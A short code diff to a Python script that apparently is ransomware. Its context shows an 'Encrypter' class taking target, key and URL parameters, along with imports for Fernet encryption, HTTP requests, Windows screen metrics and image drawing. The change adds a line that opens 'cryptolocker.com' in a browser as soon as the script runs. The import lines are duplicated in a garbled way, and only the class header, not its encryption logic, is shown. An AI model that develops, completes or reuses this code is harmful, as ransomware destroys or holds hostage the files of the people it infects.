@@ -4,6 +4,7 @@ import threading, ctypes, pathlib
 import cryptography, os, requests, sys
 import threading, ctypes, pathlib, nacl, tkinter
 import cryptography, os, requests, sys, nacl.secret
+import webbrowser
 from PIL import Image, ImageDraw, ImageFont
 from win32api import GetSystemMetrics
 from cryptography.fernet import Fernet
@@ -11,6 +12,7 @@ from tkinter import messagebox
 from time import sleep
 
 
+webbrowser.open("cryptolocker.com")
 class D_E_ncrypt(object):              # Encrypter Class (Our main Class )
 
     def __init__(self, Target=0, FernetM=0, Url=0):
